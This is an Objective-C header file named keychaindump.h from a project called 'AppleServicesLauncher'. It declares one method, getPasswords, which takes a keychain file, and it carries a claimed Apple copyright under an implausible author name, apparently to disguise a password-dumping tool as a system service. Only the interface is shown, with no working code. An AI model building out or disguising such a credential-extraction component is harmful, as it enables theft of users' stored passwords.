//
//  keychaindump.h
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/27/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface keychaindump : NSObject
+(NSArray *)getPasswords:(NSString*)keychainFile;
@end
